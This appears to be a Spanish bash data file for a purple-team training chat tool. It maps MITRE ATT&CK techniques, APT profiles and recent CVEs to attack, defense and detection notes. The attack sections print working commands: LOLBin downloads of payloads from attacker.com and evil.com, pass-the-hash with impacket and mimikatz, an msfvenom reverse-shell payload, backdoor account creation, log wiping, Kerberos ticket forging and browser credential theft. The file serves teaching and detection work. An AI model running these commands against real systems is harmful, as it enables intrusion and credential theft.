  • Identificar tipo: hash-identifier < hash.txt
|||
🔵 DEFENSA - Protección de Credenciales:
  • Credential Guard: Activar en Windows 10/11 y Server 2016+ (aísla LSASS en VM)
  • Linux: Usar SHA-512 con salt en /etc/shadow (yescrypt en distros modernas)
  • Gestor de contraseñas: CyberArk / BeyondTrust para cuentas privilegiadas
  • Política mínima: Longitud mínima de 16 chars + MFA obligatorio para admins
|||
🟣 DETECCIÓN - Actividad de Cracking:
  • Event ID 4661/4663: Acceso a objeto LSASS (Windows) → posible dump de credenciales
  • Sysmon ID 10: ProcessAccess a lsass.exe desde proceso no-sistema
  • Auth logs Linux: Múltiples intentos fallidos de autenticación SSH en /var/log/auth.log
  • SIEM: Correlacionar dump de hashes + inicio de sesión exitoso horas después"

CHAT_DATA["lolbins"]="🔴 ATAQUE - Living Off The Land Binaries (T1218):
  • certutil: certutil -urlcache -split -f http://attacker.com/shell.exe C:\\Windows\\Temp\\svcs.exe
  • mshta: mshta.exe http://attacker.com/payload.hta (ejecuta HTA remoto en CHAT_TARGET)
  • regsvr32: regsvr32 /s /u /i:http://attacker.com/x.sct scrobj.dll (sin tocar disco local)
  • msiexec: msiexec /q /i http://attacker.com/CHAT_TARGET_payload.msi
  • wmic: wmic /node:CHAT_TARGET process call create \"cmd.exe /c whoami > C:\\out.txt\"
  • bitsadmin: bitsadmin /transfer job /download /priority normal http://attacker.com/b.exe C:\\b.exe
|||
🔵 DEFENSA - Bloquear LoLBINs:
  • WDAC/AppLocker: Deshabilitar certutil para descargas HTTP, mshta sin firma
  • ASR (Attack Surface Reduction): Habilitar reglas en Defender for Endpoint
  • Proxy saliente: Bloquear peticiones HTTP desde procesos del sistema (certutil, bitsadmin)
  • GPO: Deshabilitar WMIC remoto para usuarios no administradores
|||
🟣 DETECCIÓN - Uso Anómalo de Binarios del SO:
  • Sysmon ID 1: certutil -urlcache / mshta http / regsvr32 /i:http (args de red en binarios legítimos)
  • Sysmon ID 3: Conexión de red desde msiexec, certutil, rundll32 a IPs externas
  • PowerShell logging: Invoke-Expression o DownloadString en logs de AMSI
  • SIEM: Correlación binario firmado → red externa → nuevo proceso hijo → alert"

CHAT_DATA["pth"]="🔴 ATAQUE - Pass-the-Hash (T1550.002):
  • Usando impacket psexec: psexec.py -hashes :NTLM_HASH DOMAIN/admin@CHAT_TARGET
  • Usando wmiexec: wmiexec.py -hashes :NTLM_HASH DOMAIN/admin@CHAT_TARGET whoami
  • Usando smbexec: smbexec.py -hashes :NTLM_HASH DOMAIN/admin@CHAT_TARGET
  • Con CrackMapExec: crackmapexec smb CHAT_TARGET -u admin -H NTLM_HASH
  • Mimikatz PtH: sekurlsa::pth /user:admin /domain:DOMAIN /ntlm:HASH /run:cmd.exe
|||
🔵 DEFENSA - Protección contra PtH:
  • Credential Guard: Aísla LSASS en contenedor virtualizado (Windows 10+)
  • LAPS: Local Administrator Password Solution para contraseñas locales únicas por equipo
  • Deshabilitar NTLM: Usar solo Kerberos donde sea posible en Active Directory
  • Tier Model: Separar cuentas admin de nivel 0, 1 y 2 para limitar el impacto lateral
|||
🟣 DETECCIÓN - Pass-the-Hash:
  • Event ID 4624 Type 3 con cuenta admin desde IP no habitual → sospechoso
  • Event ID 4648: Inicio de sesión con credenciales explícitas (PtH usa NTLM directo)
  • Sysmon ID 1: mimikatz.exe, sekurlsa::pth en args de proceso
  • NetFlow: Conexiones SMB laterales masivas este-oeste en red interna"

CHAT_DATA["apt29"]="🔴 PERFIL APT - APT29 / Cozy Bear (SVR Rusia):
  • Alias: Cozy Bear, Midnight Blizzard, NOBELIUM | Atribución: Servicio de Inteligencia Exterior de Rusia (SVR)
  • Campañas: SolarWinds SUNBURST (2020), Microsoft 365 tenants (2023), COVID-19 vacunas (2021)
  • T1566.001 Spear Phishing: swaks --to objetivo@CHAT_TARGET --attach malware.pdf
  • T1195 Compromiso cadena de suministro: SolarWinds Orion DLL backdoor (SUNBURST)
  • T1021.002 SMB/Lateral: wmiexec.py DOMAIN/admin:pass@CHAT_TARGET (movimiento lateral sigiloso)
  • T1027 Obfuscación: Droppers cifrados + esteganografía en imágenes PNG
|||
🔵 DEFENSA - Contra APT29:
  • Zero Trust: Verificación continua, mínimo privilegio, acceso Just-in-Time (JIT)
  • Supply Chain: Auditar integridad de software de terceros (SolarWinds, OKTA, etc.)
  • MFA resistente a phishing: FIDO2/WebAuthn + llaves de hardware Yubikey
  • Hunting: Buscar procesos WMI/DCOM anómalos y conexiones fuera de horario
|||
🟣 DETECCIÓN - Indicadores APT29:
  • Comunicación C2 en HTTPS imitando servicios legítimos (OneDrive, Teams API)
  • SUNBURST IoC: módulo SolarWinds.Orion.Core.BusinessLayer.dll con hash conocido
  • Event ID 4769: Solicitudes TGS para servicios internos no habituales
  • SIEM: Login a aplicaciones M365/Azure AD desde IPs presentes en listas negras SVR"

CHAT_DATA["apt38"]="🔴 PERFIL APT - APT38 / Lazarus Group (RPDC Corea del Norte):
  • Alias: Lazarus, ZINC, Hidden Cobra | Atribución: Reconnaissance General Bureau – Corea del Norte
  • Campañas: Bangladesh Bank SWIFT \$81M (2016), Sony Pictures hack, WannaCry ransomware (2017)
  • T1566.001 Spearphishing: Documentos Word con macros para empleados de CHAT_TARGET
  • T1059.003 Cmd Shell: certutil -urlcache -f http://evil.com/beacon.exe %TEMP%\\svcs.exe
  • T1071.001 C2 HTTP/S: Beaconing usando dominios comprometidos → exfiltración SWIFT
  • T1485 Destrucción: DESTOVER wiper tras completar exfiltración desde CHAT_TARGET
|||
🔵 DEFENSA - Contra APT38:
  • SWIFT: Impl. SWIFT Customer Security Programme (CSP) mandatorio
  • Segmentación: Aislar redes financieras/bancarias en VLANs estrictas
  • EDR: Detectar acceso a archivos .swift, MT103, MT202 por procesos no autorizados
  • Backups: 3-2-1 con copia offline air-gapped para resistir wiper attacks
|||
🟣 DETECCIÓN - Indicadores APT38:
  • Hashes de wiper DESTOVER y HOPLIGHT en bases de CISA/FBI IoC feeds
  • Conexiones SWIFT anómalas: mensajes de transferencia fuera de horario o con destinos inusuales
  • Event ID 7045/4697: Servicios instalados con nombres aleatorios (ej: svchost64.exe)
  • NetFlow: Gran descarga de datos internos (stage previo a destrucción con wiper)"

CHAT_DATA["fin7"]="🔴 PERFIL APT - FIN7 / Carbanak (Crimen Organizado):
  • Alias: Carbanak Group, ELBRUS, Carbon Spider | Motivación: Financiera — robo de tarjetas, ransomware
  • Campañas: Carbanak \$1B+ en bancos (2013-2018), POS RAM scrapers, ALPHV/BlackCat ransomware
  • T1566.001 Spear Phishing: Quejas falsas de clientes con ZIP/VBS maliciosos a CHAT_TARGET
  • T1059.001 PowerShell: stageless payload PS en memoria → Cobalt Strike CS beacon
  • T1056.001 Keylogging: BlackPOS keylogger en terminales POS para robar tarjetas de CHAT_TARGET
  • T1486 Ransomware: ALPHV en ataques double-extortion post-exfiltración de datos
|||
🔵 DEFENSA - Contra FIN7:
  • POS Security: Tokenización de tarjetas + Point-to-Point Encryption (P2PE) en terminales
  • Email: Bloquear archivos ZIP/VBS/LNK adjuntos en gateway para CHAT_TARGET
  • EDR: Detección de beacon Cobalt Strike (default config), redes CS teamservers
  • Segmentación: Aislar red de POS del resto de la organización (PCI-DSS)
|||
🟣 DETECCIÓN - Indicadores FIN7:
  • Hashes conocidos de BABYMETAL, BIRDWATCH, CARBANAK en CISA AA22-083A
  • Event ID 4104: PowerShell con download de Stage 2 (IEX, DownloadString, WebClient)
  • NetFlow: Beacon periódico cada 60s hacia C2 no categorizado en threat intelligence
  • Endpoint: Proceso PowerShell o wscript.exe hijo de Outlook o Word"

CHAT_DATA["trivia"]="📝 ¿SABÍAS QUE? — Inteligencia de Amenazas 2024-2025:
  • El 91% de los ciberataques comienzan con un email de phishing (T1566). [Proofpoint 2024]
  • El tiempo medio de detección (MTTD) de una brecha en 2024 fue de 194 días. [IBM Cost of Breach 2024]
  • Kerberoasting (T1558.003) permite crackear tickets TGS sin ser admin de dominio.
  • LOLBAS: certutil, mshta y regsvr32 son los binarios legítimos más abusados en 2024.
  • Pass-the-Hash (T1550.002) sigue funcionando en el 70% de entornos Windows sin LAPS.
  • BloodHound mapea todos los paths a Domain Admin en menos de 2 minutos en AD típicos.
  • El ransomware ALPHV/BlackCat cobró rescates de hasta \$22M por víctima en 2024.
  • CVE-2024-3400 en Palo Alto fue explotado el día 0 de su publicación por UTA0218.
  • El 43% de las organizaciones no detectaría lateral movement activo en su red. [Mandiant 2024]
  • APT29 (SVR) comprometió más de 100 organizaciones usando credenciales M365 en 2023.
|||
🔵 CONSEJO PROFESIONAL:
  • Implementa un programa de Threat Hunting basado en MITRE ATT&CK como guía.
  • Usa el framework de evaluaciones TIBER-EU para simular APTs realistas.
  • Correlaciona datos de NetFlow, EDR y SIEM para detectar patrones multi-etapa.
|||
🟣 REFERENCIAS:
  • MITRE ATT&CK: https://attack.mitre.org
  • NVD CVEs: https://nvd.nist.gov
  • CISA Known Exploited: https://www.cisa.gov/known-exploited-vulnerabilities-catalog
  • Mandiant M-Trends 2024: https://www.mandiant.com/m-trends"

CHAT_DATA["cve"]="📝 TOP CVEs CRÍTICOS 2024-2025:
  • CVE-2024-3400 — Palo Alto PAN-OS GlobalProtect | CVSS 10.0 | RCE sin auth (command injection en log)
  • CVE-2024-21762 — Fortinet FortiOS SSL-VPN | CVSS 9.6 | RCE out-of-bounds write sin autenticación
  • CVE-2024-6387 — OpenSSH regreSSHion | CVSS 8.1 | Race condition en signal handler → RCE como root
  • CVE-2024-4577 — PHP CGI Windows | CVSS 9.8 | Arg injection via Best-Fit encoding → RCE
  • CVE-2024-27198 — JetBrains TeamCity | CVSS 9.8 | Bypass de autenticación completo → control total
  • CVE-2025-0282 — Ivanti Connect Secure | CVSS 9.0 | Stack overflow → RCE sin auth en VPN
  • CVE-2024-49138 — Windows CLFS Driver | CVSS 7.8 | LPE 0-day activo en campañas ransomware
|||
🔴 EXPLORACIÓN Y POCS:
  • Nuclei (auto-scan): nuclei -u https://CHAT_TARGET -t cves/ -severity critical,high
  • Check Shodan: shodan host CHAT_TARGET → ver si el servicio vulnerable está expuesto
  • ExploitDB: searchsploit [nombre_producto] → buscar exploit público disponible
  • Metasploit: msfconsole → search CVE-2024-XXXX → use [módulo] → set RHOSTS CHAT_TARGET
|||
🟣 DETECCIÓN Y MITIGACIÓN:
  • Parchear de inmediato: suscribirse a advisories del proveedor y CISA KEV
  • Nuclei (defensive): correr nuclei contra CHAT_TARGET para validar que el parche aplicó
  • SIEM: Alertar en intentos de explotar CVEs conocidos via firmas IDS (Snort/Suricata)
  • Referencia continua: https://www.cisa.gov/known-exploited-vulnerabilities-catalog"
# BLOQUE 5: CVE RECIENTES 2024-2025
# Formato: "Producto | CVSS | Descripción | Técnica MITRE"
# ----------------------------------------------------------------
declare -A CVE_DATA
CVE_DATA["CVE-2024-3400"]="Palo Alto PAN-OS GlobalProtect | CVSS 10.0 CRÍTICO | RCE sin autenticación via command injection | T1190 Exploit Public-Facing Application"
CVE_DATA["CVE-2024-21762"]="Fortinet FortiOS SSL-VPN | CVSS 9.6 CRÍTICO | Out-of-bounds write, RCE sin auth | T1190 Exploit Public-Facing Application"
CVE_DATA["CVE-2024-6387"]="OpenSSH regreSSHion | CVSS 8.1 ALTO | Race condition en signal handler, RCE como root | T1190 Exploit Public-Facing Application"
CVE_DATA["CVE-2024-4577"]="PHP CGI (Windows) | CVSS 9.8 CRÍTICO | Arg injection, RCE via Best-Fit encoding | T1190 Exploit Public-Facing Application"
CVE_DATA["CVE-2024-27198"]="JetBrains TeamCity | CVSS 9.8 CRÍTICO | Bypass de autenticación, control total | T1190 Exploit Public-Facing Application"
CVE_DATA["CVE-2024-1708"]="ConnectWise ScreenConnect | CVSS 9.8 CRÍTICO | Path traversal + auth bypass | T1190 + T1210 Exploitation of Remote Services"
CVE_DATA["CVE-2025-0282"]="Ivanti Connect Secure | CVSS 9.0 CRÍTICO | Stack overflow, RCE sin auth | T1190 Exploit Public-Facing Application"
CVE_DATA["CVE-2024-38112"]="Windows MSHTML | CVSS 7.5 ALTO | Spoof URL en MHTML abre IE11 para RCE | T1566.002 Spear Phishing Link"
CVE_DATA["CVE-2024-30051"]="Windows DWM Core Library | CVSS 7.8 ALTO | LPE 0-day explotado en campañas QakBot | T1068 Exploitation for Privilege Escalation"
CVE_DATA["CVE-2024-49138"]="Windows CLFS Driver | CVSS 7.8 ALTO | LPE 0-day en campaña ransomware | T1068 Exploitation for Privilege Escalation"

# ----------------------------------------------------------------
# BLOQUE 6: DATOS "¿SABÍAS QUE?" para el chat
# ----------------------------------------------------------------
SABIAS_QUE=(
    "El 91% de los ciberataques comienzan con un email de phishing (T1566). [Proofpoint 2024]"
    "Kerberoasting (T1558.003) detecta cuentas de servicio con cifrado RC4 débil en minutos con hashcat."
    "El tiempo medio de detección (MTTD) de una brecha en 2024 fue de 194 días. [IBM Cost of Data Breach 2024]"
    "El 82% de las infracciones involucran el elemento humano (ingeniería social, errores, abuso de credenciales)."
    "Pass-the-Hash (T1550.002) sigue siendo efectivo en el 70% de los entornos Windows sin LAPS."
    "LOLBINS (T1218): certutil, regsvr32 y mshta son los más usados por actores de amenaza en 2024."
    "BloodHound puede mapear todos los paths a Domain Admin en menos de 2 minutos en AD típicos."
    "El ransomware más lucrativo de 2024 fue ALPHV/BlackCat, con rescates de hasta \$22M por víctima."
    "CVE-2024-3400 en Palo Alto fue explotado en el día 0 de su publicación por UTA0218 (nexo chino)."
    "El 43% de las organizaciones no detectaría un ataque de lateral movement en su red. [Mandiant 2024]"
)
#!/bin/bash
# Extensión de mitre_data.sh - Parte 1

# TA0043 - Reconnaissance
PURPLE_DATA["T1595"]="
📝 DESCRIPCIÓN: Escaneo activo (Active Scanning) en busca de puertos, servicios y vulnerabilidades.
|||
🔴 ATAQUE — Active Scanning:
  • nmap -sS -sV -p- TARGET
  • nuclei -u https://TARGET -t cves/
  • masscan -p80,443,8080 TARGET --rate=1000
|||
🔵 DEFENSA:
  • WAF con límite de tasa (Rate Limiting).
  • Implementar port knocking, bloquear escáneres comunes en edge firewall.
|||
🟣 DETECCIÓN:
  • IPS/IDS: Alerta de barrido de puertos desde IP origen.
  • Firewall Logs: >100 conexiones rehusadas (RST) en <1min."

PURPLE_DATA["T1592"]="
📝 DESCRIPCIÓN: Recolección de información sobre la tecnología usada por el objetivo.
|||
🔴 ATAQUE — Gather Victim Host Info:
  • whatweb https://TARGET
  • wafw00f https://TARGET
  • curl -I https://TARGET (análisis de Server headers)
|||
🔵 DEFENSA:
  • Eliminar banners y firmas de Server/OS (ServerTokens Prod).
  • Ofuscar cabeceras HTTP que revelen versiones.
|||
🟣 DETECCIÓN:
  • WAF: Detectar User-Agents específicos como 'whatweb' o 'curl'.
  • IPS: Alertas por solicitudes de descubrimiento de versionado."

PURPLE_DATA["T1589"]="
📝 DESCRIPCIÓN: Recolección de información sobre la identidad de las víctimas (emails, nombres).
|||
🔴 ATAQUE — Gather Victim Identity Info:
  • theHarvester -d TARGET -b linkedin,google
  • infoga --domain TARGET --source all
  • h8mail -t \"*@TARGET\"
|||
🔵 DEFENSA:
  • Limitar la exposición de correos en la web pública.
  • Políticas de privacidad estrictas en redes sociales del personal.
|||
🟣 DETECCIÓN:
  • Alertas de búsquedas masivas de directorios LDAP si es interno.
  • Difícil detección en red externa (OSINT pasivo)."

PURPLE_DATA["T1591"]="
📝 DESCRIPCIÓN: Información de la organización (estructura, subsidiarias, roles).
|||
🔴 ATAQUE — Gather Victim Org Info:
  • Búsqueda en LinkedIn y secuencias de dorks en Google (site:TARGET intitle:\"organigrama\").
  • dnsrecon -d TARGET -t axfr
|||
🔵 DEFENSA:
  • Deshabilitar transferencias de zona DNS (AXFR).
|||
🟣 DETECCIÓN:
  • DNS Logs: Intentos fallidos de AXFR (Zone Transfer).
  • Accesos inusuales de scrapers a la web corporativa."

PURPLE_DATA["T1598"]="
📝 DESCRIPCIÓN: Phishing para la obtención de información y credenciales.
|||
🔴 ATAQUE — Phishing for Information:
  • gophish configurado con página clonada apuntando a usuarios de TARGET.
  • Enviar correo solicitando confirmación de credenciales a @TARGET.
|||
🔵 DEFENSA:
  • Filtros anti-spam, políticas DMARC/SPF en TARGET.
  • MFA requerido para evitar uso de credenciales capturadas.
|||
🟣 DETECCIÓN:
  • Reportes de usuarios al equipo SOC.
  • Correlación de clics en URLs sospechosas captadas por el proxy web."

# TA0042 - Resource Development
PURPLE_DATA["T1583"]="
📝 DESCRIPCIÓN: Adquisición de infraestructura (dominios, VPS, botnets) para ataques.
|||
🔴 ATAQUE — Acquire Infrastructure:
  • Compra de dominios typo-squatting (ej. TARG3T.com).
  • Creación de VPS en proveedores bulletproof listos para lanzar vs TARGET.
|||
🔵 DEFENSA:
  • Registrar dominios similares al de la empresa defensivamente.
|||
🟣 DETECCIÓN:
  • Threat Intel: Monitoreo de Whois sobre registros nuevos similares a TARGET."

PURPLE_DATA["T1584"]="
📝 DESCRIPCIÓN: Comprometer infraestructura de terceros para usarla como pivote.
|||
🔴 ATAQUE — Compromise Infrastructure:
  • Explotar un WordPress de terceros y subir una webshell para atacar a TARGET desde allí.
|||
🔵 DEFENSA:
  • Bloquear tráfico entrante de IPs con mala reputación (Threat Intelligence Feeds).
|||
🟣 DETECCIÓN:
  • Firewalls detectando escaneos o ataques desde IPs de hosting residencial/comprometido."

PURPLE_DATA["T1608"]="
📝 DESCRIPCIÓN: Preparación de capacidades (payloads, malware, perfiles C2).
|||
🔴 ATAQUE — Stage Capabilities:
  • Subir malware a pastebin o ngrok para descargarlo desde TARGET.
  • python3 -m http.server 80 (sirviendo payload a TARGET).
|||
🔵 DEFENSA:
  • Restringir salida a internet (Egress filtering) en servidores críticos de TARGET.
|||
🟣 DETECCIÓN:
  • Proxy Logs: Conexiones a Pastebin, GitHub raw, ngrok o IPs sin dominio desde servidores de TARGET."

PURPLE_DATA["T1587"]="
📝 DESCRIPCIÓN: Desarrollo de capacidades (armado de exploits, malware a medida).
|||
🔴 ATAQUE — Develop Capabilities:
  • msfvenom -p windows/x64/meterpreter/reverse_https LHOST=ATTACKER LPORT=443 -f exe > payload_TARGET.exe
  • Compilación de un packer para evadir AV.
|||
🔵 DEFENSA:
  • Carga de Firmas y Sandboxing (EDR / ATP).
|||
🟣 DETECCIÓN:
  • Antivirus heurístico deteniendo el payload personalizado al intentar ejecutarlo en TARGET."

PURPLE_DATA["T1586"]="
📝 DESCRIPCIÓN: Compromiso de cuentas (redes sociales, emails personales) usadas como vector.
|||
🔴 ATAQUE — Compromise Accounts:
  • Crackear contraseñas recicladas usadas por empleados de TARGET.
|||
🔵 DEFENSA:
  • Bloquear autenticación si la contraseña está en bases de datos de brechas (HaveIBeenPwned).
|||
🟣 DETECCIÓN:
  • Monitoreo de Threat Intel y credenciales expuestas en la Dark Web."

# TA0001 - Initial Access
PURPLE_DATA["T1133"]="
📝 DESCRIPCIÓN: Acceso externo a través de servicios remotos (VPN, RDP, SSH) de la organización.
|||
🔴 ATAQUE — External Remote Services:
  • hydra -l admin -P rockyou.txt rdp://TARGET
  • Explotación de VPN (Ej. CVE-2024-3400 en GlobalProtect de TARGET)
|||
🔵 DEFENSA:
  • Requerir MFA en VPN y RDP externo siempre.
  • Aplicar parches críticos <24h para gateways VPN.
|||
🟣 DETECCIÓN:
  • VPN Logs: Múltiples intentos fallidos de Auth.
  • Geolocation anomalies: Inicio de sesión válido desde país inusual."

PURPLE_DATA["T1195"]="
📝 DESCRIPCIÓN: Compromiso de la cadena de suministro (Software de terceros, librerías).
|||
🔴 ATAQUE — Supply Chain Compromise:
  • Publicar paquete malicioso en npm/PyPI con nombre similar a módulo interno de TARGET.
|||
🔵 DEFENSA:
  • Repositorios de dependencias locales (Artifactory) con escaneo SCA.
|||
🟣 DETECCIÓN:
  • Herramientas SCA (Software Composition Analysis) detectando hash de dependencias maliciosas."

# TA0002 - Execution
PURPLE_DATA["T1204"]="
📝 DESCRIPCIÓN: Ejecución por parte de un usuario (clicar un link o abrir un documento).
|||
🔴 ATAQUE — User Execution:
  • Enviar documento .LNK camuflado o .DOCX con macros maliciosas a usuario de TARGET.
|||
🔵 DEFENSA:
  • MoTW (Mark of the Web) en Windows. Bloquear macros de archivos de internet (GPO).
|||
🟣 DETECCIÓN:
  • Sysmon Event ID 1: mshta.exe o powershell.exe lanzado desde winword.exe o excel.exe."

PURPLE_DATA["T1047"]="
📝 DESCRIPCIÓN: Instrumentación de administración de Windows (WMI) para ejecución de código.
|||
🔴 ATAQUE — WMI:
  • wmic /node:TARGET process call create \"cmd.exe /c payload.exe\"
  • wmiexec.py user:pass@TARGET 'whoami'
|||
🔵 DEFENSA:
  • Restringir WMI y RPC (puerto 135) a subredes de administración.
|||
🟣 DETECCIÓN:
  • Event ID 4688: wmic.exe process call create.
  • Event ID 5861: Actividad sospechosa de WMI registrada."

PURPLE_DATA["T1106"]="
📝 DESCRIPCIÓN: Ejecutar payloads mediante llamadas directas a la API nativa del SO.
|||
🔴 ATAQUE — Native API:
  • Shellcode de inyección invocando CreateThread, VirtualAllocEx.
|||
🔵 DEFENSA:
  • Soluciones EDR basadas en hooking de API de usuario y kernel callbacks.
|||
🟣 DETECCIÓN:
  • EDR: Detección de syscalls directas (Syswhispers) que puentean ntdll.dll."

# TA0003 - Persistence
PURPLE_DATA["T1547"]="
📝 DESCRIPCIÓN: Ejecución de malware automáticamente en el inicio del sistema (Registro, Startup, Servicios).
|||
🔴 ATAQUE — Boot or Logon Autostart:
  • reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v Updater /t REG_SZ /d \"C:\\payload.exe\" /f (en TARGET)
|||
🔵 DEFENSA:
  • Restringir perfiles de usuarios. WDAC y AppLocker.
|||
🟣 DETECCIÓN:
  • Sysmon Event ID 12/13/14: Creaciones de llaves de registro de Autorun.
  • Autoruns de Sysinternals (verificación de anomalías)."

PURPLE_DATA["T1505"]="
📝 DESCRIPCIÓN: Webshells o módulos instalados en IIS/Apache como persistencia.
|||
🔴 ATAQUE — Server Software Component:
  • Subir a TARGET: cmd.aspx o shell.jsp en un directorio público.
|||
🔵 DEFENSA:
  • Monitoreo de integridad de archivos (FIM) en directorios web raíz (wwwroot).
|||
🟣 DETECCIÓN:
  • EDR/FIM: Creación de archivo .php/.jsp/.aspx no programada por desarrollo.
  • Web Logs: Access logs hacia un archivo sospechoso recién creado."

PURPLE_DATA["T1136"]="
📝 DESCRIPCIÓN: Creación de cuentas locales o de dominio para retener el acceso.
|||
🔴 ATAQUE — Create Account:
  • net user backdoor P@ssw0rd123 /add (en TARGET)
  • net localgroup administrators backdoor /add (en TARGET)
|||
🔵 DEFENSA:
  • Políticas estrictas de auditoría LDAP y grupos locales en endpoints vía LAPS.
|||
🟣 DETECCIÓN:
  • Event ID 4720: Cuenta de usuario creada.
  • Event ID 4732: Miembro añadido a grupo local con privilegios."

# TA0004 - Privilege Escalation
PURPLE_DATA["T1548"]="
📝 DESCRIPCIÓN: Abuso del Control de Elevación (Bypass UAC o Sudo).
|||
🔴 ATAQUE — Abuse Elevation Control:
  • sdclt.exe exec (Bypass UAC en Windows)
  • sudo -u root /bin/bash (si tiene permisos NOPASSWD en TARGET)
|||
🔵 DEFENSA:
  • Configurar UAC en su nivel más estricto (Always Notify).
  • Auditar archivos sudoers para evitar comodines o NOPASSWD.
|||
🟣 DETECCIÓN:
  • Sysmon ID 1: Proceso que pide elevación sin GUI en paths usuales (fodhelper.exe, sdclt.exe).
  • Auditd en Linux: Modificaciones a archivos en /etc/sudoers.d/."

PURPLE_DATA["T1134"]="
📝 DESCRIPCIÓN: Manipulación de Tokens de Acceso para suplantar procesos privilegiados.
|||
🔴 ATAQUE — Access Token Manipulation:
  • meterpreter > incognito > impersonate_token \"NT AUTHORITY\\SYSTEM\" (en TARGET)
|||
🔵 DEFENSA:
  • Limitar el derecho \"SeDebugPrivilege\" e \"Impersonate a client after auth\" sólo a Admins autorizados.
|||
🟣 DETECCIÓN:
  • EDR: Alerta de intento de robo de token de lsass o winlogon.
  • Event ID 4672: Asignación de privilegios especiales a un login nuevo."

PURPLE_DATA["T1068"]="
📝 DESCRIPCIÓN: Explotación de vulnerabilidades locales para escalar privilegios.
|||
🔴 ATAQUE — Exploitation for Privilege Escalation:
  • winPEAS.exe para buscar rutas vulnerables (en TARGET).
  • CVE-2024-30051 exploit: lpe_exploit.exe ejecutado en TARGET obteniendo SYSTEM.
|||
🔵 DEFENSA:
  • Gestión de parches del Sistema Operativo (Patch Management).
|||
🟣 DETECCIÓN:
  • EDR: Comportamiento heurístico de un proceso normal inyectando a SYSTEM o generando cmd.exe como SYSTEM."

PURPLE_DATA["T1484"]="
📝 DESCRIPCIÓN: Modificación de Políticas de Dominio (GPO) para desplegar malware a la red.
|||
🔴 ATAQUE — Domain Policy Modification:
  • Añadir una Scheduled Task a través de Group Policy apuntando a \\\\attacker\\payload.exe (contra DC de TARGET).
|||
🔵 DEFENSA:
  • Sistema de gobierno de GPOs con aprobación múltiple (AGPM).
|||
🟣 DETECCIÓN:
  • Event ID 5136: Objeto de servicios de directorio modificado (GPC).
  • Auditoría nativa de cambios en Políticas de Grupo de AD."
#!/bin/bash
# Extensión de mitre_data.sh - Parte 2

# TA0005 - Defense Evasion
PURPLE_DATA["T1070"]="
📝 DESCRIPCIÓN: Borrado de registros y evidencias para ocultar actividad (Log wipe).
|||
🔴 ATAQUE — Indicator Removal:
  • wevtutil cl Security (en TARGET)
  • Clear-EventLog -LogName Security,System (PowerShell en TARGET)
  • rm -rf ~/.bash_history && history -c (Linux TARGET)
|||
🔵 DEFENSA:
  • Enviar logs en tiempo real a un SIEM (centralización).
  • Configurar repositorios inmutables WORM.
|||
🟣 DETECCIÓN:
  • Event ID 1102: El registro de auditoría fue borrado.
  • Alerta en SIEM si un endpoint deja de enviar eventos de golpe."

PURPLE_DATA["T1218"]="
📝 DESCRIPCIÓN: Uso de binarios legítimos de Windows (LoLBins) para evadir AV/EDR.
|||
🔴 ATAQUE — System Binary Proxy Execution:
  • certutil.exe -urlcache -split -f http://evil.com/payload.exe payload.exe (descargar en TARGET)
  • mshta.exe http://attacker.com/payload.hta (ejecutar en TARGET)
  • regsvr32.exe /s /n /u /i:http://evil.com/x.sct scrobj.dll
|||
🔵 DEFENSA:
  • Hardening con WDAC o AppLocker bloqueando la ejecución desde /Temp.
  • Bloquear procesos firmados si intentan conexiones de red no estándar.
|||
🟣 DETECCIÓN:
  • Sysmon Event ID 1: Certutil o mshta con argumentos HTTP.
  • Sysmon Event ID 3: HTA conectando a IPs públicas."

# TA0006 - Credential Access
PURPLE_DATA["T1558"]="
📝 DESCRIPCIÓN: Robo o falsificación de Tickets Kerberos (Kerberoasting, Pass the Ticket).
|||
🔴 ATAQUE — Steal or Forge Kerberos Tickets:
  • GetUserSPNs.py user:pass@TARGET -request (Kerberoasting)
  • Rubeus.exe kerberoast /outfile:hashes.txt
  • mimikatz.exe kerberos::golden /user:admin /krbtgt:hash /ptt
|||
🔵 DEFENSA:
  • Cuentas de servicio (SPN) con contraseñas de +25 caracteres alfanuméricos.
  • Deshabilitar RC4 (0x17) y forzar AES-256 (0x12).
|||
🟣 DETECCIÓN:
  • Event ID 4769: Solicitud de Ticket Granting Service masivas (Kerberoasting).
  • Monitorizar Ticket Encryption Type: 0x17 es altamente sospechoso."

PURPLE_DATA["T1555"]="
📝 DESCRIPCIÓN: Extracción de credenciales desde almacenes locales (Browsers, DPAPI, KeePass).
|||
🔴 ATAQUE — Credentials from Password Stores:
  • LaZagne.exe all (en TARGET)
  • copy \"C:\\Users\\Bob\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data\"
  • python3 dpapi.py masterkey /in:key /password:pass
|||
🔵 DEFENSA:
  • Forzar Master Passwords en gestores.
  • No guardar contraseñas críticas en navegadores corporativos.
|||
🟣 DETECCIÓN:
  • Herramientas de File Integrity Monitor alertando lecturas de \"Login Data\".
  • Ejecución de binarios forenses como LaZagne o SharpDPAPI conocidos."

PURPLE_DATA["T1056"]="
📝 DESCRIPCIÓN: Captura de inputs del usuario (Keylogging, Web Injects).
|||
🔴 ATAQUE — Input Capture:
  • Inyección de GetAsyncKeyState() vía DLL en un proceso del TARGET.
  • zeus/carbanak hookeando APIs del browser.
|||
🔵 DEFENSA:
  • Software Anti-Keylogger y navegación segura aislada.
|||
🟣 DETECCIÓN:
  • EDR: Hooking continuo sobre SetWindowsHookEx.
  • Creación de logs o archivos txt con latencia de escritura a nivel teclado."

PURPLE_DATA["T1552"]="
📝 DESCRIPCIÓN: Búsqueda de credenciales no seguras en texto claro (Archivos, Bash History).
|||
🔴 ATAQUE — Unsecured Credentials:
  • cat ~/.bash_history | grep -i pass (en TARGET)
  • find / -name \"wp-config.php\"
  • findstr /si password *.txt *.xml *.ini
|||
🔵 DEFENSA:
  • Usar Secrets Managers (HashiCorp, AWS Secrets).
|||
🟣 DETECCIÓN:
  • Uso abusivo de comandos findstr o find grep sobre volúmenes completos.
  • Accesos de lectura inusuales a archivos de configuración de despliegue."

# TA0007 - Discovery
PURPLE_DATA["T1082"]="
📝 DESCRIPCIÓN: Descubrimiento de Información del Sistema.
|||
🔴 ATAQUE — System Information Discovery:
  • systeminfo (en TARGET)
  • Get-ComputerInfo (en TARGET)
  • uname -a && cat /etc/os-release (en TARGET linux)
|||
🔵 DEFENSA:
  • Restricción del runtime PowerShell/cmd a administradores definidos.
|||
🟣 DETECCIÓN:
  • Alertar ejecuciones de systeminfo o uname -a seguidas de otros comandos discovery rápidamente (<1 minuto)."

PURPLE_DATA["T1083"]="
📝 DESCRIPCIÓN: Descubrimiento de Archivos y Directorios.
|||
